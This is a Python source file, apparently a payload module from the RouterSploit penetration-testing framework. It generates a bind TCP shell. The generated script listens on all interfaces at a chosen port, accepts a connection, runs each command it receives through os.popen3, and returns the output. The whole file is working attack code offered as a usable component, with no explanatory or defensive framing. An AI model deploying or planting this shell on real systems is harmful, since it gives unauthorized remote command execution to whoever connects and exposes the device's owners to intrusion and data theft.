from routersploit.core.exploit.option import OptEncoder
from routersploit.core.exploit.payloads import (
    GenericPayload,
    Architectures,
    BindTCPPayloadMixin,
)
from routersploit.modules.encoders.python.base64 import Encoder


class Payload(BindTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Python Bind TCP",
        "description": "Creates interactive tcp bind shell by using python.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    architecture = Architectures.PYTHON
    encoder = OptEncoder(Encoder(), "Encoder")

    def generate(self):
        return (
            "import socket,os\n" +
            "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" +
            "so.bind(('0.0.0.0',{}))\n".format(self.rport) +
            "so.listen(1)\n" +
            "so,addr=so.accept()\n" +
            "x=False\n" +
            "while not x:\n" +
            "\tdata=so.recv(1024)\n" +
            "\tstdin,stdout,stderr,=os.popen3(data)\n" +
            "\tstdout_value=stdout.read()+stderr.read()\n" +
            "\tso.send(stdout_value)\n"
        )
